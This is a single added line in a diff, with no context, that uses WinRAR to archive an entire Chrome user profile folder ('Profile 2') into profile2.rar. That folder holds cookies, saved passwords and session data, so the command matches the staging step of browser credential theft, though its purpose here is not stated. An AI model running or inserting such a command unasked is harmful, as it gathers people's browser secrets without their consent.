@@ -1,0 +1,1 @@
+"C:\Program Files\WinRAR\rar.exe" a -r profile2.rar "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Profile 2\*" 
